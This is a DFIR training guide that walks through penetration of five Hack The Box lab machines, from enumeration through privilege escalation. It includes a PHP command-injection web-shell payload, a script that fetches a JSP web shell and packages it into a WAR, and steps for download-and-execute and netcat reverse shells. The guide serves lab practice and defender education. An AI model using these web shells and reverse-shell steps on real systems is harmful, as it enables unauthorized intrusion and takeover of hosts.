# Emulating Threat Methodologies

An analysts job is defense-oriented. IR must actively interpret events to solve problems under stress and various time constraints. Therefore, our goal is to constantly develop and improve our competence in---and ultimately master---DFIR skill sets, including:  

- Deny adversary opportunities to attack
- Identify and counter use of offensive techniques
- Evaluate the success and impact of adversary actions
- Explain logic and intent of adversary actions and decisions

To do this, we need a clear understanding of what *offensive* actions are being performed, why they are being used, and what an adversary can obtain/accomplish on a system at any given time.

We could map out the hundreds of techniques from Mitre's [Technique Matrix](https://attack.mitre.org/wiki/Technique_Matrix), construct a training program to practice and build skills with each one, simulate them all in a controlled environment under different conditions...

Or we could gamify the whole process---Use one of the many [penetration testing practice and vulnerable app platforms](https://www.amanhardikar.com/mindmaps/Practice.html) available, compete against other security enthusiasts, and have some fun while we learn.






This training document will show examples of practicing threat methodologies using [Hack The Box](https://www.hackthebox.eu) a pen-testing lab platform where you can assess your current skill level, gauge your progress, and maintain a constant sense of progression.

- [Optimum](#optimum)
	- [Optimum Remote Enumeration](#optimum-remote-enumeration)
	- [Optimum Remote Exploit](#optimum-remote-exploit)
	- [Optimum Local Enumeration](#optimum-local-enumeration)
	- [Optimum Local Exploit](#optimum-local-exploit)
- [Devel](#devel)
	- [Devel Remote Enumeration](#devel-remote-enumeration)
	- [Devel Remote Exploit](#devel-remote-exploit)
	- [Devel Local Enumeration](#devel-local-enumeration)
	- [Devel Local Exploit](#devel-local-exploit)
- [Bart](#bart)
	- [Bart Remote Enumeration](#bart-remote-enumeration)
	- [Bart Remote Exploit](#bart-remote-exploit)
	- [Bart Local Enumeration](#bart-local-enumeration)
	- [Bart Local Exploit](#bart-local-exploit)
- [Jerry](#jerry)
	- [Jerry Remote Enumeration](#jerry-remote-enumeration)
	- [Jerry Remote Exploit](#jerry-remote-exploit)
	- [Jerry Local Enumeration](#jerry-local-enumeration)
- [Lame](#Lame)
	- [Lame Remote Enumeration](#Lame-remote-enumeration)
	- [Lame Remote Exploit](#Lame-remote-exploit)
	- [Lame Local Enumeration](#Lame-local-enumeration)
	- [Lame Local Exploit](#Lame-local-exploit)


### Methodology Used

Reconnaissance is not needed in most training labs.  The IP Address is provided and you start with the remote enumeration phase.  

Installing persistence and covering tracks can be difficult in a training lab where multiple users are attacking the machine, making changes to files, and resetting the VMs.

Therefore, we will walkthrough each machine using the following abbreviated methodology:

|Step|Description|
|-|-|
|[Remote Enumeration](#remote-enumeration)|Scan target system to identify ports/services/versions|
|[Remote Exploit](#remote-exploit)|Gain access to the target machine|
|[Local Enumeration](#local-enumeration)|Search the target machine for opportunities to escalate privileges|
|[Local Exploit](#local-exploit)|Escalate privileges to gain full control of target machine|

Loosely follow the same steps, as you'll see some are skipped or some are more complex depending on the specific scenario.

### Kali VM and Network Setup

Import Kali Linux OVA and run with virtualization software.

Select an image and download:

![](../images/Kali%20Linux/image030.png)<br><br>

When complete, verify SHA256 matches what is reported on `kali.org`:

![](../images/Kali%20Linux/image031.png)<br><br>

Import the OVA (`vboxmanage` for VirtualBox), modify settings, and start the machine:

```
# Import OVA
vboxmanage import kali-linux-2018.2-vbox-amd64.ova

# Modify RAM, CPUs, and USB
vboxmanage modifyvm Kali-Linux-2018.2-vbox-amd64 --memory 4096 --cpus 1 --usb off

# Modify NIC
vboxmanage modifyvm Kali-Linux-2018.2-vbox-amd64 --nic1 bridged --bridgeadapter1 wlp2s0 (or other interface)

# Start VM
vboxmanage startvm Kali-Linux-2018.2-vbox-amd64 --type gui
```

Kali Linux is now running on the VM:

![](../images/Kali%20Linux/image032.png)<br><br>

To learn more about options for running and customizing Kali Linux, try the free [Kali Linux Revealed](https://kali.training/lessons/introduction/) course.  For additional setup details, see [Introduction to Kali Linux](Introduction%20to%20Kali%20Linux.md).


## Optimum

This machine is called Optimum and is missing some updates on its OS/applications.

- [Optimum Remote Enumeration](#optimum-remote-enumeration)
- [Optimum Remote Exploit](#optimum-remote-exploit)
- [Optimum Local Enumeration](#optimum-local-enumeration)
- [Optimum Scripting and Automation](#optimum-scripting-and-automation)
- [Optimum Local Exploit](#optimum-local-exploit)


### Optimum Remote Enumeration

Start out with a scan to identify open ports and services. This shows port 80 is open:

![](images/Emulating%20Threat%20Methodologies/image040.png)<br><br>

An Nmap service version scan identifies HFS 2.3: 

![](images/Emulating%20Threat%20Methodologies/image039.png)<br><br>

Nikto also identifies HFS 2.3:

![](images/Emulating%20Threat%20Methodologies/image038.png)<br><br>

You can also confirm by visiting the webpage:

![](images/Emulating%20Threat%20Methodologies/image041.png)<br><br>


### Optimum Remote Exploit

Use `searchsploit` to search for exploits for that application:

![](images/Emulating%20Threat%20Methodologies/image037.png)<br><br>

This one allows code execution:

![](images/Emulating%20Threat%20Methodologies/image042.png)<br><br>

Testing with this POC didn't yield any results, so I searched for a Metasploit module for this exploit and found one.

After setting the required options, the module was used to deploy a meterpreter agent in memory:

![](images/Emulating%20Threat%20Methodologies/image044.png)<br><br>

Now you can read the hash in file `c:\Users\kostas\Desktop\user.txt`.

### Optimum Local Enumeration

There are several good options for local enumeration on a Windows system.

You can upload `windows-privesc-check2.exe` to the target and run it:

![](images/Emulating%20Threat%20Methodologies/image045.png)<br><br>

This creates an HTML report:

![](images/Emulating%20Threat%20Methodologies/image049.png)<br><br>

Or you could drop to a shell and type in commands manually:

![](images/Emulating%20Threat%20Methodologies/image048.png)<br><br>

### Optimum Scripting and Automation

Try using `searchsploit` again:

![](images/Emulating%20Threat%20Methodologies/image050.png)<br><br>

Import the `Sherlock.ps1` script into the session.  It shows three possibilities:

![](images/Emulating%20Threat%20Methodologies/image051.png)<br><br>

Or use `windows-exploit-suggester.py`:

![](images/Emulating%20Threat%20Methodologies/image062.png)<br><br>


### Optimum Local Exploit

The MS16-098 works on this box.  You can compile yourself or download the binary from OffSec's Github repo:

![](images/Emulating%20Threat%20Methodologies/image063.png)<br><br>

Transfer it to the target machine and run it:

![](images/Emulating%20Threat%20Methodologies/image064.png)<br><br>

In testing labs, there is traditionally a `root.txt` file that contains a hash or code which when read represents obtaining total control of the system.

With control of the Adminstrator account, you can now read the hash in the file `c:\Users\Administrator\Desktop\root.txt`.

## Devel

This machine is named Devel and has some configuration errors and missing updates.

- [Devel Remote Enumeration](#devel-remote-enumeration)
- [Devel Remote Exploit](#devel-remote-exploit)
- [Devel Local Enumeration](#devel-local-enumeration)
- [Devel Local Exploit](#devel-local-exploit)


### Devel Remote Enumeration

First, scan for ports and services:

![](images/Emulating%20Threat%20Methodologies/image065.png)<br><br>

FTP is available, and you can log on as user anonymous and read files:

![](images/Emulating%20Threat%20Methodologies/image066.png)<br><br>

The files here indicate this is an IIS server.  Create a webshell with `msvenom` and write it to the server:

![](images/Emulating%20Threat%20Methodologies/image068.png)<br><br>

This creates a page with an embedded script that injects meterpreter into memory:

![](images/Emulating%20Threat%20Methodologies/image069.png)<br><br>

### Devel Remote Exploit

Copy the webshell to the IIS directory using FTP:

![](images/Emulating%20Threat%20Methodologies/image070.png)<br><br>

Then open MSF with msfconsole and set up and run the `multi/exploit/hander` module:

![](images/Emulating%20Threat%20Methodologies/image071.png)<br><br>

Now visit the webpage with your browser and you will receive a shell:

![](images/Emulating%20Threat%20Methodologies/image072.png)<br><br>


### Devel Local Enumeration

Move to the `C:\Windows\Temp` folder where low privilege accounts have write access.  Then background the meterpreter session with `bg` and then run the `local_exploit_suggester` module:

![](images/Emulating%20Threat%20Methodologies/image073.png)<br><br>

Search for one of the suggested exploits:

![](images/Emulating%20Threat%20Methodologies/image074.png)<br><br>

List options for the module with `options` and configure for your session and target:

![](images/Emulating%20Threat%20Methodologies/image075.png)<br><br>

### Devel Local Exploit

Run the exploit:

![](images/Emulating%20Threat%20Methodologies/image076.png)<br><br>

Now you can read the hash in file `c:\Users\Administrator\Desktop\root.txt`.

## Bart

This machine is named Bart and has some exploitable vulnerabilities due to weak password strength and poor credential hygiene.

- [Bart Remote Enumeration](#bart-remote-enumeration)
- [Bart Remote Exploit](#bart-remote-exploit)
- [Bart Local Enumeration](#bart-local-enumeration)
- [Bart Local Exploit](#bart-local-exploit)


### Bart Remote Enumeration

Scanning the system reveals only one port is open:

![](images/Emulating%20Threat%20Methodologies/image078.png)<br><br>

Navigating to the port redirects to `forum.bart.htb`.  Adjust your `/etc/hosts` file and the site will load properly:

![](images/Emulating%20Threat%20Methodologies/image077.png)<br><br>

This time `Gobuster`, `dirbuster`, and others didn't return any interesting results.

Using `wfuzz` returns results, but you will find that requests for non-existent pages return 200 OK responses.  To work around this we can filter responses we don't want with the `--hc` argument:

```
wfuzz -c -z /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt --hc 200,302 http://bart.htb/FUZZ
```

![](images/Emulating%20Threat%20Methodologies/image080.png)<br><br>

Add `monitor.bart.htb` to your `/etc/hosts` file and reload and you'll find a login page:

![](images/Emulating%20Threat%20Methodologies/image081.png)<br><br>

[Cewl]() and [John the Ripper]() can be combined to create a list of likely passwords: 

![](images/Emulating%20Threat%20Methodologies/image082.png)<br><br>

BurpSuite's Intruder can now be used to send login requests using passwords from the generated list.


### Bart Remote Exploit

Start Burp up and configure your browser to use it as a proxy (set to `127.0.0.1:8080`) then attempt to login and have Burp catch the POST:

![](images/Emulating%20Threat%20Methodologies/image083.png)<br><br>

Right click and send it to Intruder (or press `Ctrl-I`)

Set the payload positions (one for the user, one for the password):

![](images/Emulating%20Threat%20Methodologies/image084.png)<br><br>

Load your mangled list under the Payload tab:

![](images/Emulating%20Threat%20Methodologies/image085.png)<br><br>

After trying the list with user **harvey**, the correct password is found:

![](images/Emulating%20Threat%20Methodologies/image086.png)<br><br>

After logging in with the credentials, you'll find another host:

![](images/Emulating%20Threat%20Methodologies/image087.png)<br><br>

Research on this particular chat program shows how to register a new account with a POST request:

```
curl -X POST http://internal-01.bart.htb/simple_chat/register.php -d "uname=newuser&passwd=password"
```

Create a new account with your own username and password. Once logged in, look at the source code of the page:

![](images/Emulating%20Threat%20Methodologies/image088.png)<br><br>

Every time `/log/log.php` is visited, the user agent is logged in `/log/log.txt`:

![](images/Emulating%20Threat%20Methodologies/image089.png)<br><br>

The server executes code on this page and we can control the useragent string in our request. That means we can place arbitrary code in our useragent string that will be executed when the page loads.

This is accomplished by first making the string of PHP code `<?php system($_REQUESET['cmd']); ?>` appear on the page.

Once that happens, the server will now look for a `cmd` value which we can provide it in a web request.  Start with a simple command like `whoami` and look for a response:

![](images/Emulating%20Threat%20Methodologies/image090.png)<br><br>

Now we'll attempt to improve single commands to shell access. Serve the `Invoke-PowerShellTcp.ps1` script on port 80 with the `http.server` Python module and put a command to download and execute a reverse shell in the useragent string:

![](images/Emulating%20Threat%20Methodologies/image091.png)<br><br>

We now have an interactive PowerShell session with a reverse TCP shell.

### Bart Local Enumeration

We've got a PowerShell session, but enumeration is more easily done with a post-exploitation agent in memory.

Deploy [PoshC2]() agent to the target. You can download the PoshC2 EXE using PowerShell commands or by using the same method we used to get the shell:

![](images/Emulating%20Threat%20Methodologies/image092.png)<br><br>

Then execute the file:

![](images/Emulating%20Threat%20Methodologies/image093.png)<br><br>

Use the agent's `invoke-allchecks` command to find autologon credentials:

![](images/Emulating%20Threat%20Methodologies/image094.png)<br><br>


### Bart Local Exploit

Since this host only exposes port 80, we'll need to expose a service or configure port forwarding to log on with the discovered credentials.  Meterpreter's `portfwd` is a great tool for this and is used here to create a route from the Kali host to the SMB service on the target machine:

![](images/Emulating%20Threat%20Methodologies/image095.png)<br><br>

Then use [Impacket]()'s `smbpsexec.py` to logon via SMB as the Adminstrator:

![](images/Emulating%20Threat%20Methodologies/image096.png)<br><br>

Now you can read the hash in file `c:\Users\Administrator\Desktop\root.txt`.

## Jerry

Jerry is another machine with credential hygiene problems.

- [Jerry Remote Enumeration](#jerry-remote-enumeration)
- [Jerry Remote Exploit](#jerry-remote-exploit)
- [Jerry Local Enumeration](#jerry-local-enumeration)
- [Jerry Local Exploit](#jerry-local-exploit)

### Jerry Remote Enumeration

Check for open ports/services:

![](images/Emulating%20Threat%20Methodologies/image098.png)<br><br>

Tomcat login page discovered on port 8080 with a link to log in to the Manager Application:

![](images/Emulating%20Threat%20Methodologies/image097.png)<br><br>

Inspecting the source code of the page reveals a username and password:

![](images/Emulating%20Threat%20Methodologies/image099.png)<br><br>

After logging in with these credentials, we see this user has the ability to upload WAR files.

### Jerry Remote Exploit

Create a WAR using the following script:

```bash
#!/bin/bash
wget https://raw.githubusercontent.com/tennc/webshell/master/jsp/jspbrowser/Browser.jsp -O index.jsp
rm -rf webshell && rm -f wshell.war && mkdir wshell
cp index.jsp wshell/ && cd wshell
jar -cvf ../wshell.war *
```

Upload the wshell.war file and then scroll down and find it in the Manager App:

![](images/Emulating%20Threat%20Methodologies/image100.png)<br><br>

Clicking on it will navigate to the shell were you can use it to perform local enumeration:

![](images/Emulating%20Threat%20Methodologies/image101.png)<br><br>

### Jerry Local Enumeration

In this case, the webshell will allow you to navigate to the Administrator Desktop and grab both flags in one place:

![](images/Emulating%20Threat%20Methodologies/image102.png)<br><br>


## Lame 

- [Lame Remote Enumeration](#lame-remote-enumeration)
- [Lame Remote Exploit](#lame-remote-exploit)
- [Lame Code Execution Improvement](#lame-code-execution-improvement)
- [Lame Local Enumeration](#lame-local-enumeration)
- [Lame Local Exploit](#lame-local-exploit)


### Lame Remote Enumeration

Initial scan shows several different open ports and services:

![](images/Emulating%20Threat%20Methodologies/image029.png)<br><br>

Research on `distcc` reveals it is the Distributed C/C++ Compiler and is known to have a vulnerability that allows remote code execution.

Searching with `searchsploit` shows there is a known exploit for this service:

![](images/Emulating%20Threat%20Methodologies/image030.png)<br><br>

### Lame Remote Exploit

A Metasploit module for this exploit can be found:

![](images/Emulating%20Threat%20Methodologies/image028.png)<br><br>

Configure options:

![](images/Emulating%20Threat%20Methodologies/image032.png)<br><br>

Run the exploit:

![](images/Emulating%20Threat%20Methodologies/image031.png)<br><br>

### Lame Local Enumeration

Background the shell session with `Ctrl-Z` and bring up the `shell_to_meterpreter` module options:

![](images/Emulating%20Threat%20Methodologies/image033.png)<br><br>

Configure the options and run the module:

![](images/Emulating%20Threat%20Methodologies/image034.png)<br><br>

Now you can interact with the new meterpreter session with `sessions -i 2`:

![](images/Emulating%20Threat%20Methodologies/image035.png)<br><br>

Or run a different module with it, such as the `local_exploit_suggester` module:

![](images/Emulating%20Threat%20Methodologies/image027.png)<br><br>

These three don't work, let's try another script... upload `linuxprivchecker.py`, drop into a shell, and run it:

![](images/Emulating%20Threat%20Methodologies/image025.png)<br><br>

The script suggests the following exploits:

![](images/Emulating%20Threat%20Methodologies/image026.png)<br><br>

### Lame Local Exploit

Download the exploit file `8572.c` and host it on Kali with `python3 -m http.server`.  Download this file to the target machine with `wget <kali-ip>:8000/8572.c`.  

Compile the file using `gcc 8572.c -o exploit`. GCC reports an error but the executable should be there:

![](images/Emulating%20Threat%20Methodologies/image023.png)<br><br>

Then create a file named `run` containing a command to start a reverse shell to the attacking machine using netcat:

![](images/Emulating%20Threat%20Methodologies/image024.png)<br><br>

Finally, listen on port 9999 with netcat on Kali.  On the target machine, find the PID of netlink with `cat /proc/net/netlink` and execute the `exploit` file with the PID as an argument:

![](images/Emulating%20Threat%20Methodologies/image022.png)<br><br>

You are now root and can open the flag files located at `/home/makis/user.txt` and `/root/root.txt`.

## Summary


Start with knowledge, build that knowledge into skills using practical application, and constantly refine these skills through practice and testing.

This will improve each skill individually as well as your ability to integrate and interface between different skill sets with speed and accuracy.  